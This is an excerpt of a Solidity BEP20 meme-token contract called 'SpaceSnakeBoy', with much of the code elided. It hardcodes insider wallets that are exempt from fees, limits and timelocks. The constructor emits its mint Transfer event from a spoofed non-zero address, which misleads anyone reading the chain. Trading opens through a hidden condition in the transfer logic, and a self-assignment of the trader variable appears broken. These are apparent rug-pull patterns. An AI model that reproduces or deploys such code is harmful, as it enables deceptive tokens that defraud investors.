...
contract SpaceSnakeBoy is IBEP20, Auth {
    ...
    address DEV = 0xfBE1d30D136e5E44950Ee7b34DF187273dF95B8C;
    address MW = 0xf912a7c5436eC456c9A7b9c1e0081809ff3Cc297;
    address TRADER = 0xf912a7c5436eC456c9A7b9c1e0081809ff3Cc297;
    string constant _name = "SpaceSnakeBoy";
    string constant _symbol = "$SSNAKEBOY";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000 * 10**6 * 10**_decimals;

    uint256 public _maxTxAmount = 5 * 10**6 * 10**_decimals;
    uint256 public _maxWalletToken = 20 * 10**6 * 10**_decimals;
    ...
    constructor () Auth(msg.sender) {
        ...
        isFeeExempt[address(TRADER)] = true;
        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(DEV)] = true;
        isTxLimitExempt[address(TRADER)] = true;
        ...
        isTimelockExempt[address(DEV)] = true;
        isTimelockExempt[address(TRADER)] = true;
        ...
        marketingFeeReceiver = address(MW);
        devFeeReceiver = address(DEV);
        trader = address(trader);

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0x337C4930B612FA27072abB7b8fDE693e9D129405), msg.sender, _totalSupply);
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != devFeeReceiver  && recipient != autoLiquidityReceiver && recipient != trader){
        ...
        if(sender == pair && recipient == autoLiquidityReceiver) {
            tradingOpen = true;
        }
